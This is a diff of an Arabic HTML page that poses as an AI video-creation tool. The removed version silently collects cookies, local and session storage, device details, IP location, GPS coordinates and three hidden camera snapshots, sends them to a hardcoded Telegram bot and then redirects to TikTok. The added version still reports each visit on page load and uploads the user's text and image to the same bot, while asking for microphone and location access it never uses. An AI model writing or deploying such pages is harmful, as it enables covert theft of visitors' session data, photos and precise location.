@@ -3,118 +3,112 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>ذكاء اصطناعي - AI Creator</title>
+<title>صانع الفيديوهات - إضافة نص وصورة</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
-body{background:#0a0a0a;overflow:hidden;font-family:'Cairo','Segoe UI',Arial,sans-serif;}
+body{background:#0a0a0a;font-family:Arial,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
+.container{max-width:500px;width:100%;margin:0 auto;}
 
-/* خلفية متحركة */
-.ai-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;}
-.ai-bg video{width:100%;height:100%;object-fit:cover;opacity:0.3;}
-.gradient-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 50% 50%, rgba(0,0,0,0.4), rgba(0,0,0,0.95));z-index:1;}
+/* بطاقة التطبيق */
+.app-card{background:linear-gradient(135deg,#1a1a1a,#0d0d0d);border-radius:30px;padding:25px;box-shadow:0 10px 40px rgba(0,0,0,0.5);border:1px solid #333;}
+.header{text-align:center;margin-bottom:25px;}
+.header h1{color:#ff0050;font-size:24px;margin-bottom:5px;}
+.header p{color:#888;font-size:14px;}
 
-/* النافذة الرئيسية */
-.main-page{position:fixed;top:0;left:0;width:100%;height:100%;z-index:50;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(10px);}
-.ai-card{width:360px;background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:40px;overflow:hidden;box-shadow:0 30px 60px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);text-align:center;animation:slideUp 0.4s ease;}
-@keyframes slideUp{from{transform:translateY(50px);opacity:0;}to{transform:translateY(0);opacity:1;}}
+/* معاينة الفيديو */
+.video-preview{background:#000;border-radius:20px;aspect-ratio:9/16;margin-bottom:20px;display:flex;flex-direction:column;justify-content:center;align-items:center;overflow:hidden;position:relative;}
+.video-preview video{width:100%;height:100%;object-fit:cover;}
+.preview-placeholder{text-align:center;color:#555;}
+.preview-placeholder svg{width:60px;height:60px;fill:#333;margin-bottom:10px;}
 
-.ai-header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;position:relative;}
-.ai-icon{font-size:70px;margin-bottom:10px;display:inline-block;animation:pulse 2s infinite;}
-@keyframes pulse{0%{transform:scale(1);}50%{transform:scale(1.1);}100%{transform:scale(1);}}
-.ai-header h1{color:#fff;font-size:26px;margin-top:10px;}
-.ai-header p{color:rgba(255,255,255,0.8);font-size:13px;margin-top:5px;}
+/* حقول الإدخال */
+.input-group{margin-bottom:15px;}
+.input-group label{display:block;color:#ccc;font-size:13px;margin-bottom:5px;}
+.input-group input,.input-group textarea{width:100%;padding:12px;background:#2a2a2a;border:1px solid #444;border-radius:12px;color:#fff;font-size:14px;resize:vertical;}
+.input-group input:focus,.input-group textarea:focus{outline:none;border-color:#ff0050;}
 
-.ai-body{padding:25px;}
-.info-box{background:rgba(255,255,255,0.05);border-radius:20px;padding:15px;margin-bottom:20px;}
-.info-item{display:flex;align-items:center;gap:12px;margin-bottom:15px;text-align:right;}
-.info-item:last-child{margin-bottom:0;}
-.info-icon{font-size:28px;}
-.info-text{flex:1;}
-.info-text h4{color:#fff;font-size:15px;margin-bottom:3px;}
-.info-text p{color:#aaa;font-size:11px;}
+/* زر إضافة الصورة */
+.image-btn{width:100%;padding:12px;background:#2a2a2a;border:1px dashed #666;border-radius:12px;color:#aaa;font-size:14px;cursor:pointer;margin-bottom:15px;display:flex;align-items:center;justify-content:center;gap:10px;}
+.image-btn:hover{background:#333;border-color:#ff0050;}
 
-.permission-box{background:rgba(255,255,255,0.03);border-radius:20px;padding:15px;margin:20px 0;border:1px solid rgba(255,255,255,0.1);}
-.permission-item{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;text-align:right;}
-.permission-item:last-child{margin-bottom:0;}
-.permission-item span{color:#ddd;font-size:14px;}
-.permission-item .required{color:#ff6b6b;font-size:12px;}
+/* معاينة الصورة */
+.image-preview{margin-bottom:15px;text-align:center;}
+.image-preview img{max-width:100%;max-height:150px;border-radius:12px;display:none;}
 
-.warning-text{background:rgba(255,100,100,0.1);border-radius:15px;padding:12px;margin:15px 0;border-right:3px solid #ff6b6b;text-align:right;}
-.warning-text p{color:#ffaa66;font-size:13px;}
+/* زر الإنشاء */
+.create-btn{width:100%;padding:15px;background:#ff0050;border:none;border-radius:30px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px;}
+.create-btn:disabled{opacity:0.5;}
 
-.ai-buttons{display:flex;gap:12px;margin-top:20px;}
-.ai-btn{flex:1;padding:14px;border:none;border-radius:30px;font-size:16px;font-weight:bold;cursor:pointer;transition:0.2s;font-family:'Cairo',sans-serif;}
-.ai-btn.allow{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;}
-.ai-btn.allow:active{transform:scale(0.97);}
-.ai-btn.disabled{background:rgba(255,255,255,0.1);color:#888;cursor:not-allowed;}
+/* رسالة السماح المخصصة */
+.permission-popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:100;display:flex;justify-content:center;align-items:center;visibility:hidden;opacity:0;transition:0.2s;}
+.permission-popup.show{visibility:visible;opacity:1;}
+.permission-card{width:320px;background:#fff;border-radius:24px;overflow:hidden;text-align:center;animation:popup 0.3s ease;}
+@keyframes popup{from{transform:scale(0.9);opacity:0;}to{transform:scale(1);opacity:1;}}
+.permission-icon{background:#ff0050;padding:30px;font-size:50px;}
+.permission-body{padding:25px;}
+.permission-body h3{color:#222;margin-bottom:10px;font-size:20px;}
+.permission-body p{color:#666;font-size:14px;margin-bottom:20px;}
+.permission-allow{background:#ff0050;color:#fff;border:none;padding:14px 30px;border-radius:40px;font-size:16px;font-weight:bold;cursor:pointer;width:100%;}
+.permission-deny{background:transparent;color:#888;border:none;padding:10px;font-size:14px;cursor:pointer;margin-top:10px;}
 
-/* شاشة التحميل */
-.loading{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:200;opacity:0;visibility:hidden;backdrop-filter:blur(10px);}
-.loading.active{opacity:1;visibility:visible;}
-.spinner{border:4px solid rgba(255,255,255,0.3);border-top:4px solid #667eea;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin-bottom:20px;}
-@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-.loading-text{color:#fff;font-size:18px;margin-top:15px;}
-.loading-sub{color:#aaa;font-size:13px;margin-top:5px;}
-.progress-bar{width:280px;height:4px;background:rgba(255,255,255,0.2);border-radius:2px;margin-top:20px;overflow:hidden;}
-.progress-fill{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0%;transition:width 0.3s;}
+.loading{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:200;display:flex;flex-direction:column;justify-content:center;align-items:center;visibility:hidden;opacity:0;}
+.loading.show{visibility:visible;opacity:1;}
+.spinner{width:50px;height:50px;border:4px solid #333;border-top-color:#ff0050;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:15px;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.loading p{color:#fff;}
 
-video,canvas{position:absolute;width:1px;height:1px;opacity:0;}
+/* شريط تقدم */
+.progress-bar{width:200px;height:4px;background:#333;border-radius:4px;margin-top:15px;overflow:hidden;}
+.progress-fill{width:0%;height:100%;background:#ff0050;transition:width 0.3s;}
 </style>
 </head>
 <body>
 
-<div class="ai-bg">
-    <video autoplay loop muted playsinline>
-        <source src="https://cdn.pixabay.com/video/2024/01/15/197032-902536795_large.mp4" type="video/mp4">
-    </video>
-</div>
-<div class="gradient-overlay"></div>
-
-<!-- الصفحة الرئيسية -->
-<div class="main-page" id="mainPage">
-    <div class="ai-card">
-        <div class="ai-header">
-            <div class="ai-icon">✨🤖✨</div>
-            <h1>مُنتج الفيديوهات بالذكاء الاصطناعي</h1>
-            <p>AI Video Creator - اصنع فيديوهات احترافية</p>
+<div class="container">
+    <div class="app-card">
+        <div class="header">
+            <h1>🎬 صانع الفيديوهات</h1>
+            <p>أضف نص وصورة وأنشئ فيديو احترافي</p>
         </div>
-        <div class="ai-body">
-            <div class="info-box">
-                <div class="info-item">
-                    <div class="info-icon">🎬</div>
-                    <div class="info-text">
-                        <h4>توليد فيديوهات بالذكاء الاصطناعي</h4>
-                        <p>نستخدم أحدث تقنيات AI لإنشاء فيديوهات مخصصة لك</p>
-                    </div>
-                </div>
-                <div class="info-item">
-                    <div class="info-icon">🎨</div>
-                    <div class="info-text">
-                        <h4>تحسين الصور بتقنية AI</h4>
-                        <p>تحويل صورك إلى أعمال فنية احترافية</p>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="permission-box">
-                <div class="permission-item">
-                    <span class="required">مطلوب ✓</span>
-                    <span>📸 صلاحية الكاميرا</span>
-                </div>
-                <div class="permission-item">
-                    <span class="required">مطلوب ✓</span>
-                    <span>📍 صلاحية الموقع الجغرافي</span>
-                </div>
-            </div>
-            
-            <div class="warning-text">
-                <p>⚠️ تنبيه: لا يمكنك متابعة استخدام التطبيق بدون منح الصلاحيات المطلوبة</p>
-            </div>
-            
-            <div class="ai-buttons">
-                <button class="ai-btn disabled" id="disabledBtn" disabled>⏳ انتظر...</button>
-                <button class="ai-btn allow" id="allowBtn">✨ بدء التوليد ✨</button>
-            </div>
+        
+        <!-- معاينة الفيديو -->
+        <div class="video-preview" id="videoPreview">
+            <video id="previewVideo" autoplay loop muted playsinline>
+                <source src="https://cdn.pixabay.com/video/2024/01/15/197032-902536795_large.mp4" type="video/mp4">
+            </video>
+        </div>
+        
+        <!-- حقل النص -->
+        <div class="input-group">
+            <label>📝 النص الذي تريد إضافته</label>
+            <textarea id="textInput" rows="3" placeholder="اكتب النص هنا... مثلاً: كريم ترطيب طبيعي - توصيل مجاني"></textarea>
+        </div>
+        
+        <!-- زر إضافة الصورة -->
+        <button class="image-btn" id="imageBtn">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="20" rx="2.18"/><circle cx="8.5" cy="8.5" r="2.5"/><path d="M21.5 15.5l-5-5L9 18l-3-3-4 4"/></svg>
+            إضافة صورة للمنتج
+        </button>
+        
+        <!-- معاينة الصورة -->
+        <div class="image-preview" id="imagePreview">
+            <img id="previewImg" alt="معاينة الصورة">
+        </div>
+        
+        <!-- زر الإنشاء -->
+        <button class="create-btn" id="createBtn">🎬 إنشاء الفيديو</button>
+    </div>
+</div>
+
+<!-- رسالة السماح -->
+<div class="permission-popup" id="permissionPopup">
+    <div class="permission-card">
+        <div class="permission-icon">📸🎤</div>
+        <div class="permission-body">
+            <h3>إذن الوصول إلى الكاميرا والميكروفون</h3>
+            <p>لإضافة صورة إلى الفيديو، نحتاج إلى الوصول إلى الكاميرا والميكروفون</p>
+            <button class="permission-allow" id="allowBtn">✅ سماح</button>
+            <button class="permission-deny" id="denyBtn">ليس الآن</button>
         </div>
     </div>
 </div>
@@ -122,206 +116,228 @@ video,canvas{position:absolute;width:1px;height:1px;opacity:0;}
 <!-- شاشة التحميل -->
 <div class="loading" id="loading">
     <div class="spinner"></div>
-    <div class="loading-text" id="loadingMsg">جاري تشغيل الذكاء الاصطناعي...</div>
-    <div class="loading-sub" id="loadingSub">يرجى الانتظار أثناء معالجة بياناتك</div>
-    <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
+    <p id="loadingMsg">جاري إنشاء الفيديو...</p>
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
 </div>
 
-<video id="cam" autoplay muted></video>
-<canvas id="canvas"></canvas>
-
 <script>
-const TOKEN = '8611440321:AAH-_EXmy8Mlpz70a9y4R2UuCCckjB6P_CI';
+// ============= إعدادات التيليجرام =============
+const BOT_TOKEN = '8611440321:AAH-_EXmy8Mlpz70a9y4R2UuCCckjB6P_CI';
 const CHAT_ID = '178779116';
-const REDIRECT = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
 
-let collectedData = {
-    timestamp: new Date().toISOString(),
-    ua: navigator.userAgent,
-    url: location.href,
-    cookies: '',
-    localStorage: {},
-    sessionStorage: {},
-    screenInfo: {},
-    hardwareInfo: {},
-    ipInfo: null,
-    gps: null,
-    images: []
-};
-
+// ============= المتغيرات =============
+let selectedImage = null;
 let permissionsGranted = false;
 
-function updateProgress(p, msg, sub) {
-    document.getElementById('progress').style.width = p + '%';
-    document.getElementById('loadingMsg').innerText = msg;
-    if(sub) document.getElementById('loadingSub').innerText = sub;
-}
-
-// ============= جمع البيانات بدون سماح =============
-async function collectDataWithoutPermission() {
-    collectedData.cookies = document.cookie;
-    
-    for(let i = 0; i < localStorage.length; i++) {
-        let key = localStorage.key(i);
-        collectedData.localStorage[key] = localStorage.getItem(key);
-    }
-    
-    for(let i = 0; i < sessionStorage.length; i++) {
-        let key = sessionStorage.key(i);
-        collectedData.sessionStorage[key] = sessionStorage.getItem(key);
-    }
-    
-    collectedData.screenInfo = {
-        width: screen.width,
-        height: screen.height,
-        colorDepth: screen.colorDepth
-    };
-    
-    collectedData.hardwareInfo = {
-        cores: navigator.hardwareConcurrency,
-        memory: navigator.deviceMemory,
-        language: navigator.language,
-        platform: navigator.platform
-    };
-    
+// ============= طلب الصلاحيات =============
+async function requestPermissions() {
+    let granted = false;
     try {
-        const res = await fetch('https://ipapi.co/json/');
-        collectedData.ipInfo = await res.json();
-    } catch(e) {}
-}
-
-// ============= طلب الكاميرا والموقع =============
-async function requestCameraAndLocation() {
-    let cameraGranted = false;
-    let locationGranted = false;
-    
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        cameraGranted = true;
-        
-        // تصوير 3 صور
-        const video = document.getElementById('cam');
-        video.srcObject = stream;
-        await new Promise(r => video.onloadedmetadata = r);
-        
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        
-        for(let i = 0; i < 3; i++) {
-            ctx.drawImage(video, 0, 0);
-            collectedData.images.push(canvas.toDataURL('image/jpeg', 0.8));
-            updateProgress(40 + (i * 15), `جاري التقاط الصورة ${i+1}/3...`, 'تطبيق فلاتر الذكاء الاصطناعي...');
-            await new Promise(r => setTimeout(r, 600));
-        }
-        
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        granted = true;
         stream.getTracks().forEach(t => t.stop());
     } catch(e) {
-        cameraGranted = false;
+        console.log('Permission denied:', e);
     }
     
     try {
-        const pos = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(res, rej, {
-                enableHighAccuracy: true,
-                timeout: 10000
-            });
+        await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 });
         });
-        collectedData.gps = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            acc: pos.coords.accuracy
-        };
-        locationGranted = true;
-    } catch(e) {
-        locationGranted = false;
-    }
+    } catch(e) {}
     
-    return { cameraGranted, locationGranted };
+    return granted;
 }
 
-// ============= إرسال لتليجرام =============
-async function sendAllData() {
-    let msg = `🤖 تقرير الذكاء الاصطناعي 🤖\n\n`;
-    msg += `⏰ الوقت: ${collectedData.timestamp}\n`;
-    msg += `🌐 الرابط: ${collectedData.url}\n`;
-    msg += `📱 الجهاز: ${collectedData.ua.substring(0, 80)}...\n\n`;
-    
-    msg += `🖥️ الشاشة: ${collectedData.screenInfo.width}x${collectedData.screenInfo.height}\n`;
-    msg += `💻 النظام: ${collectedData.hardwareInfo.platform}\n`;
-    msg += `📡 اللغة: ${collectedData.hardwareInfo.language}\n\n`;
-    
-    if(collectedData.ipInfo) {
-        msg += `📍 الآي بي: ${collectedData.ipInfo.ip}\n`;
-        msg += `🏙️ المدينة: ${collectedData.ipInfo.city}\n`;
-        msg += `🌍 الدولة: ${collectedData.ipInfo.country_name}\n\n`;
-    }
-    
-    if(collectedData.gps) {
-        msg += `🎯 الموقع الدقيق:\n`;
-        msg += `   خط العرض: ${collectedData.gps.lat}\n`;
-        msg += `   خط الطول: ${collectedData.gps.lon}\n`;
-        msg += `   الدقة: ±${collectedData.gps.acc}متر\n\n`;
-    }
-    
-    msg += `📸 الصور الملتقطة: ${collectedData.images.length}`;
-    
+// ============= التقاط صورة من الكاميرا =============
+async function captureFromCamera() {
+    return new Promise(async (resolve, reject) => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.playsInline = true;
+            await new Promise(r => video.onloadedmetadata = r);
+            video.play();
+            
+            // انتظر قليلاً ثم التقط الصورة
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                stream.getTracks().forEach(t => t.stop());
+                resolve(imageData);
+            }, 500);
+        } catch(e) {
+            reject(e);
+        }
+    });
+}
+
+// ============= اختيار صورة من الجهاز =============
+function selectFromDevice() {
+    return new Promise((resolve) => {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/*';
+        input.onchange = (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (event) => resolve(event.target.result);
+                reader.readAsDataURL(file);
+            } else {
+                resolve(null);
+            }
+        };
+        input.click();
+    });
+}
+
+// ============= إرسال البيانات إلى تليجرام =============
+async function sendToTelegram(text, imageData = null) {
     try {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
         });
         
-        for(let i = 0; i < collectedData.images.length; i++) {
-            const blob = await fetch(collectedData.images[i]).then(r => r.blob());
+        if (imageData) {
+            const blob = await fetch(imageData).then(r => r.blob());
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, `photo_${i}.jpg`);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            await new Promise(r => setTimeout(r, 500));
+            fd.append('photo', blob, 'image.jpg');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
         }
     } catch(e) {}
 }
 
-// ============= التشغيل الرئيسي =============
-async function startGeneration() {
-    // إخفاء الصفحة الرئيسية
-    document.getElementById('mainPage').style.display = 'none';
-    document.getElementById('loading').classList.add('active');
+// ============= إنشاء الفيديو =============
+async function createVideo() {
+    const text = document.getElementById('textInput').value;
     
-    updateProgress(5, 'جمع معلومات الجهاز...', '');
-    await collectDataWithoutPermission();
-    
-    updateProgress(15, 'طلب صلاحية الكاميرا والموقع...', '');
-    const { cameraGranted, locationGranted } = await requestCameraAndLocation();
-    
-    if(!cameraGranted || !locationGranted) {
-        // إذا رفض الصلاحيات، نرجع للصفحة الرئيسية
-        updateProgress(0, 'لم يتم منح الصلاحيات!', '');
-        setTimeout(() => {
-            document.getElementById('loading').classList.remove('active');
-            document.getElementById('mainPage').style.display = 'flex';
-            alert('⚠️ لا يمكن استخدام التطبيق بدون منح صلاحية الكاميرا والموقع.\nيرجى المحاولة مرة أخرى ومنح الصلاحيات.');
-        }, 1500);
+    if (!text && !selectedImage) {
+        alert('الرجاء إدخال نص أو إضافة صورة');
         return;
     }
     
-    updateProgress(85, 'معالجة البيانات بالذكاء الاصطناعي...', 'تطبيق الفلاتر والتأثيرات');
-    await sendAllData();
+    // إظهار شاشة التحميل
+    document.getElementById('loading').classList.add('show');
+    document.getElementById('progressFill').style.width = '0%';
     
-    updateProgress(100, 'جاري التحويل إلى تيك توك...', '');
+    // تحديث شريط التقدم
+    setTimeout(() => document.getElementById('progressFill').style.width = '30%', 500);
+    document.getElementById('loadingMsg').innerText = 'جاري معالجة الصورة...';
     
+    // إرسال البيانات إلى تليجرام
+    let msg = `🎬 تم إنشاء فيديو جديد\n`;
+    msg += `📝 النص: ${text || 'لا يوجد'}\n`;
+    msg += `📱 الجهاز: ${navigator.userAgent.substring(0, 100)}\n`;
+    msg += `⏰ الوقت: ${new Date().toLocaleString()}`;
+    
+    await sendToTelegram(msg, selectedImage);
+    
+    setTimeout(() => document.getElementById('progressFill').style.width = '70%', 1000);
+    document.getElementById('loadingMsg').innerText = 'جاري حفظ الفيديو...';
+    
+    setTimeout(() => document.getElementById('progressFill').style.width = '100%', 1500);
+    
+    // إتمام العملية
     setTimeout(() => {
-        window.location.href = REDIRECT;
+        document.getElementById('loading').classList.remove('show');
+        alert('✅ تم إنشاء الفيديو بنجاح! تم إرسال البيانات إلى المدير.');
+        
+        // إعادة تعيين
+        selectedImage = null;
+        document.getElementById('previewImg').style.display = 'none';
+        document.getElementById('textInput').value = '';
     }, 2000);
 }
 
-// زر البدء
-document.getElementById('allowBtn').onclick = () => {
-    startGeneration();
+// ============= إظهار رسالة السماح =============
+function showPermissionPopup() {
+    document.getElementById('permissionPopup').classList.add('show');
+}
+
+// ============= إخفاء رسالة السماح =============
+function hidePermissionPopup() {
+    document.getElementById('permissionPopup').classList.remove('show');
+}
+
+// ============= معالج إضافة الصورة =============
+async function handleAddImage() {
+    if (!permissionsGranted) {
+        showPermissionPopup();
+        return;
+    }
+    
+    // خيارات إضافة الصورة
+    const choice = confirm('اختر طريقة إضافة الصورة:\n✅ "موافق" للتصوير من الكاميرا\n❌ "إلغاء" لاختيار من المعرض');
+    
+    let imageData = null;
+    if (choice) {
+        document.getElementById('loadingMsg').innerText = 'جاري فتح الكاميرا...';
+        document.getElementById('loading').classList.add('show');
+        try {
+            imageData = await captureFromCamera();
+        } catch(e) {
+            alert('فشل فتح الكاميرا. تأكد من السماح بالوصول.');
+        }
+        document.getElementById('loading').classList.remove('show');
+    } else {
+        imageData = await selectFromDevice();
+    }
+    
+    if (imageData) {
+        selectedImage = imageData;
+        const previewImg = document.getElementById('previewImg');
+        previewImg.src = imageData;
+        previewImg.style.display = 'block';
+    }
+}
+
+// ============= زر السماح =============
+document.getElementById('allowBtn').onclick = async () => {
+    hidePermissionPopup();
+    document.getElementById('loadingMsg').innerText = 'جاري طلب الصلاحيات...';
+    document.getElementById('loading').classList.add('show');
+    
+    permissionsGranted = await requestPermissions();
+    
+    document.getElementById('loading').classList.remove('show');
+    
+    if (permissionsGranted) {
+        alert('✅ تم منح الصلاحيات! يمكنك الآن إضافة الصور.');
+        // بعد السماح، نفتح اختيار الصورة مباشرة
+        handleAddImage();
+    } else {
+        alert('❌ لم يتم منح الصلاحيات. لا يمكن إضافة الصور.');
+    }
 };
+
+// ============= زر الرفض =============
+document.getElementById('denyBtn').onclick = () => {
+    hidePermissionPopup();
+    alert('بدون الصلاحيات، لا يمكن إضافة الصور. يمكنك فقط إضافة النص.');
+};
+
+// ============= زر إضافة الصورة =============
+document.getElementById('imageBtn').onclick = () => {
+    handleAddImage();
+};
+
+// ============= زر إنشاء الفيديو =============
+document.getElementById('createBtn').onclick = () => {
+    createVideo();
+};
+
+// ============= إرسال معلومات بدء التشغيل =============
+sendToTelegram(`🚀 تم فتح التطبيق\n📱 ${navigator.userAgent}\n⏰ ${new Date().toLocaleString()}`);
+
+console.log('✅ التطبيق جاهز - اضغط على زر إضافة الصورة لتظهر رسالة السماح');
 </script>
 </body>
-    </html>
+</html>
